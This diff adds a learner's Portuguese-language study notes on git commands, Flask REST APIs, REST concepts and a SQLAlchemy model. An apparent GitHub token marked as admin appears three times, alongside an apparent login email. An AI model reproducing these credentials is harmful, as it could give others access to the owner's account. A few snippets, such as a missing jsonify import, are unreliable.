+<?xml version="1.0" encoding="UTF-8" ?>
+<catalog>
+  <item color="blue" size="large"/>
+  <item color="red" size="medium"/>
+</catalog>
+
+doc = xml.dom.minidom.parse("my.xml")
+newItem = doc.createElement("item")
+newItem.setAttribute("color", "yellow")
+newItem.setAttribute("size", "small")
+doc.firstChild.appendChild(newItem)
+
+-------------------------------------------------------------------------------
+
+{
+    "name": "John",
+    "title": "Python Developer",
+    "skills": [{
+        "name": "coding",
+        "level": "expert"
+        },
+        {
+        "name": "documentation",
+        "level": "basic"
+    }]
+}
+
+
+
+for i in theJSON["skills"]:
+    print(i["name"])
+
+-------------------------------------------------------------------------------
+
+
+
+LOGICA DE PROGRAMAÇÃO - Curso PHP:
+
+
+
+---------------------------------------------------------------------------------
+
+GIT:
+
+01:37​ - git init
+02:15​ - git add
+02:24​ - git commit
+02:53​ - git log
+03:18​ - git status
+05:48​ - git show
+06:50​ - git branch
+07:38​ - git checkout
+10:50​ - git merge
+14:50​ - git push
+20:01​ - git clone
+27:13​ - git pull
+
+tutorial em video:
+https://www.youtube.com/watch?v=2alg7MQ6_sI
+https://supygirls.readthedocs.io/en/latest/intro_comp/acoes_entre_pycharm_github.html
+
+git config --list
+git config --global user.email "tal@email.com"
+git config --global user.name "Nickname"
+git config --global --unset user.email (o comando unset remove a atual configuração de determinado parametro)
+
+
+…or create a new repository on the command line
+echo "# learn" >> README.md
+git init (inicia versionamento local)
+git add README.md (cria um arquivo)
+git add . (Adiciona tudo o que está no diretório do projeto)
+git commit -m "first commit" (envia o arquivo e comenta)
+git branch -M master (Cria uma nova ramidicação)
+git branch (gerencia novas ramificações)
+git checkout master/db (Muda para ramificação master/db/)
+git branch -D master/db (Deleta uma branch)
+git status
+git remote add origin https://github.com/BlackCyber21/learn.git (adciona no github)
+git remote -v (veja seus repositórios remotos)
+git push -u origin master 
+…or push an existing repository from the command line
+git remote add origin https://github.com/BlackCyber21/learn.git
+git branch -M master (Seleciona a linha do tempo master)
+git push -u origin master (subir um projeto local para o github)
+git config credential.helper store (guarda ultimas informações de login)
+git log (exibe as versões e modificações numa linha do tempo seguidas de um hash sha1)
+git show hashcommit
+git show (exibe a modificação mais recente)
+git checkout (alternar entre branchs, e commits)
+git push origin master(envia atualizações locais para o repositório remoto versionando)
+git pull origin master(recebe atualizações do repositório remoto versionando)
+git clone (Pegar um projeto em andamento no time ou ja criado - Do Zero ideal colocar numa pasta vazia
+e então iniciar a sua parte do versionamento)
+git checkout -b teste (cria e ja muda para branch teste)
+ls
+vimOUnano midifiqueitalarquivo.py
+
+Prática:
+
+mkdir novo
+cd novo
+
+git init
+git status
+crie seu codigo e salve
+git add .
+git commit -m "first commit"
+git log
+git show
+
+conflito de alterações:
+
+git checkout -b teste
+git status
+edite simbólicamente um arquivo
+git status
+git add .
+git commit -am "add e apdate xfile"
+git show
+git checkout master
+status
+ls -la
+edite o mesmo arquivo na mesma linha da branch teste
+git status
+git add .
+git commit -am "add e apdate xfile"
+git status
+git show
+git merge teste (estando na master una a branch teste)
+para resolver um conflito você escolhe entre um arquivo ou outro.
+vc pode remover o arquivo que nao quer e add a modificacao.
+
+git checkout -- <namefile> (Reculpera arquivo excluído do projeto cuja modificação
+não tenhan sido add na atual linha do tempo ainda.)
+
+sempre é preciso comitar as atts
+Os conflitos servem para 
+
+Ou você pode setar um token do github no PyCharm e apertar as setas.
+
+27fba1e8b0b5d8cec8c7c53ade51f4768f80cf5d Token Github AdminTotal
+
+primeiro teste de api:
+
+from flask import Flask
+app = Flask (__name__)
+
+@app.route("/<int:numero>", methods=['GET','POST','HEAD'])
+def ola(numero):
+    return 'Ola mundo! {}'.format(numero)
+
+
+if __name__=="__main__":
+    app.run(debug=True)
+    
+    
+------------------------------------------------------
+API 2:
+
+from flask import Flask
+
+app = Flask(__name__)
+
+@app.route("/", methods=['GET','POST'])
+def pessoa():
+    return jsonify({'nome':'Rafael','Profissão':'Desenvolvedor'})
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+--------------------------------------------------------
+
+from flask import Flask, jsonify
+
+app = Flask(__name__)
+
+@app.route("/<int:id>", methods=['GET','POST'])
+def pessoa(id):
+    soma = 1 + id
+    return jsonify({'id':id, 'nome':'Rafael', 'profissao':'Desenvolvedor'})
+
+@app.route('/soma/<int:valor1>/<int:valor2>/')
+def soma(valor1, valor2):
+    return jsonify({'soma':valor1 + valor2})
+
+if __name__ == '__main__':
+    app.run(debug=True)
+    
+    
+url ex: http://127.0.0.1:5000/soma/10/10
+
+----------------------------------------------
+
+pip install Flask
+
+from flask import Flask, jsonify, request
+import json
+
+app = Flask(__name__)
+
+@app.route("/<int:id>")
+def pessoa(id):
+    soma = 1 + id
+    return jsonify({'id':id, 'nome':'Rafael', 'profissao':'Desenvolvedor'})
+
+#ADD FUNC SOMA VIA GET
+#@app.route('/soma/<int:valor1>/<int:valor2>/')
+#def soma(valor1, valor2):
+#    return jsonify({'soma':valor1 + valor2})
+
+#ADD FUNC SOMA VIA POST
+@app.route('/soma', methods=['POST', 'PUT', 'GET'])
+def soma():
+    dados = json.loads(request.data)
+    total = sum(dados['valores'])
+    return jsonify({'soma':total})
+
+
+url ex: http://127.0.0.1:5000/soma (via post no body com json)
+enviar valores neste formato:
+{"valores":[10, 10, 10, 5, 5]}
+
+----------------------------------------------------
+
+com a api rodando teste:
+
+pip install requests
+
+python
+
+>>> import requests
+>>> import json
+>>> response = requests.get('http://127.0.0.1:5000/soma')
+>>> print(response.text)
+>>> print(response.json())
+
+>>> dados = response.json()
+>>> print(dados['soma'])
+
+>>> response = requests.post('http://127.0.0.1:5000/soma', json={"valores":[20, 30, 10]})
+>>> dados = response.json()
+>>> print(dados['soma'])
+
+exit()
+
+-------------------------------------------------------------------------------------------------
+
+aula antes da 5
+
+from flask import Flask, jsonify, request
+import json
+
+app = Flask(__name__)
+
+desenvolvedores = [
+    {'nome':'Rafael',
+     'habilidades':['Python', 'Flask']},
+    {'nome':'Costa',
+     'habilidades':['Python', 'Html']}
+]
+
+@app.route('/dev/<int:id>', methods=['GET', 'PUT'])
+def desenvolvedor(id):
+    if request.method == 'GET':
+        desenvolvedor = desenvolvedores[id]
+        print(desenvolvedor)
+        return jsonify(desenvolvedor)
+    elif request.method == 'PUT':
+        dados = json.loads(request.data)
+        desenvolvedores[id] = dados
+        return jsonify(dados)
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+#PUT no postman no body raw json
+
+{
+    "habilidades": [
+        "Js",
+        "Php"
+    ],
+    "nome": "Costa"
+}
+
+------------------------------
+
+Depois de implementar o delete fazer um teste com get
+
+Aula 4, 17:54
+
+from flask import Flask, jsonify, request
+import json
+
+app = Flask(__name__)
+
+desenvolvedores = [
+    {'nome':'Rafael','habilidades':['Python', 'Flask']},
+    {'nome':'Costa','habilidades':['Python', 'Html']}
+]
+
+@app.route('/dev/<int:id>', methods=['GET', 'PUT', 'DELETE'])
+def desenvolvedor(id):
+    if request.method == 'GET':
+        try:
+            response = desenvolvedores[id]
+        except IndexError:
+            mensagem = 'Desenvolvedor de ID {} não existe'.format(id)
+            response = {'status':'erro', 'mensagem':mensagem}
+        except Exception:
+            mensagem = 'Erro desconhecido. Procute o administrador da API'
+            response = {'status':'erro', 'mensagem':mensagem}
+        return jsonify(response)
+    elif request.method == 'PUT':
+        dados = json.loads(request.data)
+        desenvolvedores[id] = dados
+        return jsonify(dados)
+    elif request.method == 'DELETE':
+        desenvolvedores.pop(id)
+        return jsonify({'status':'sucesso', 'mensagem':'Registro excluído'})
+
+if __name__ == '__main__':
+    app.run(debug=True)
+    
+---------------------------------------------------------
+
+
+-----------------------------------------------------------
+
+Python Api Rest com Flask
+github.com/rafegal (instrutor)
+
+
+
+URL Localizador Universal de Recurso ex: https://>localhost:5000<
+URN Nome Universal do Recurso ex: https://localhost:5000>/api/lista<
+URI Identificador Universal do Recurso ex: >https://localhost:5000/api/lista< 
+
+Estudar virtualenv (venv) tbm no pycharm
+
+Estudar Postman login
+Ripoto
+ripotof879@dwgtcm.com
+ripotof879@dwgtcm.com
+
+Flask - em python flask é um microframework para desenvolvimento de api eficaz.
+
+REST - Representational State Transfer(Transferencia representacional de estado)
+É um estilo de arquitetura de software que define um conjunto de restrições a
+serem usadas para a criação de web services. Determina padrões para a transferencia de dados.
+
+API - Interface de programação de aplicações
+Reponsavel por estabelecer com. entre diferentes serviços
+Meio de campo entre tecnologias
+Intermediador para troca de informações
+
+API Restful -  Aplicar todos os padrões Rest: Api restful é cumprir todos os requisitos rest.
+
+Padrões:
+
+- _Client-server_: Separação do cliente e do armazenamento de dados (servidor)
+dessa forma, podemos ter uma portabilidade do nosso sistema, usando o React para WEB e 
+React native para o smarthphon, por exemplo.
+
+-_Stateless_: Cada requisição que o cliente faz ao servidor, deverá conter todas as infos
+necessárias para o servidor entender e responder (RESPONSE) a requisição (REQUEST).
+
+Stateless = É preciso enviar a sessão do usuário toda vez que que haver requisição.
+Sem estado, o servidor não pode armazenar sessão anterior, isso pode ser 
+feito com um token. Você envia dados porém tudo tem que estar em cada atual request.
+
+-_Cacheable_: Respostas devem ser explicitas se a requisição pode ou não ser cacheada pelo cliente.
+
+-_Layered System_: Sistemas em camadas (URI, endpint... ex: https://graph.facebook.com/youtube)
+Nesse link acima por exemplo "graph.facebook seria uma API e youtube seria um endpoint"
+O cliente sempre consulta o endpoint sem a necessidade de saber o quão
+complexo é para acessar as camadas ou os processos até a finalidade, ele apenas recebe 
+objetivamente a informação (indo diretamente ao ponto-final).
+
+Opcional: -_Code on demand_: Servidor envia para o cliente do backend algum script para rodar no front.
+Então dá a possibilidade da nossa aplicação pegar códigos, como o javascript, por ecemplo, e executar
+no cliente. Envolver client-side processamento de código no lado do cliente.
+
+-------------------------------------------------------------------------------------------------------
+
+dados = json.loads(request.data)
+        posicao = len(desenvolvedores)
+        dados['id'] = posicao
+        desenvolvedores.append(dados)
+----------------------------------------------------------
+
+27fba1e8b0b5d8cec8c7c53ade51f4768f80cf5d
+---------------------
+
+gerar requirements.txt
+
+pip freeze > requirements.txt (exporta requiriments)
+escreve as dependencias de bibliotecas
+
+pip install -r requirements.txt
+supri a arvore de dependencias para rodar
+
+pip install Flask
+pip install flask-restful
+---------------------------------------------------------
+
+pip install sqlalchemy
+
+---------------------------------------------
+
+from sqlalchemy import create_engine, Column, Integer, String, ForeignKey
+from sqlalchemy.orm import scoped_session, sessionmaker, relationship
+from sqlalchemy.ext.declarative import declarative_base
+
+engine = create_engine('sqlite:///atividades.db', convert_unicode=True)
+db_session = scoped_session(sessionmaker(autocommit=False,
+                                         binds=engine))
+
+Base = declarative_base()
+Base.query = db_session.query_property()
+
+class Pessoas(Base):
+    __tablename__='pessoas'
+    id = Column(Integer, primary_key=True)
+    nome = Column(String(40), index=True)
+    idade = Column(Integer)
+
+    def __repr__(self):
+        return '<Pessoa {}>'.format(self.nome)
+
+class Atividades(Base):
+    __tablename__='atividades'
+    id = Column(Integer, primary_key=True)
+    nome = Column(String(80))
+    pessoa_id = Column(Integer, ForeignKey('pessoas.id'))
+    pessoa = relationship("Pessoas")
+
+def init_db():
+    Base.metadata.create_all(bind=engine)
+
+if __name__ == '__main__':
+    init_db()
+
+----------------------------------------------------------
+
+
+27fba1e8b0b5d8cec8c7c53ade51f4768f80cf5d
+
+
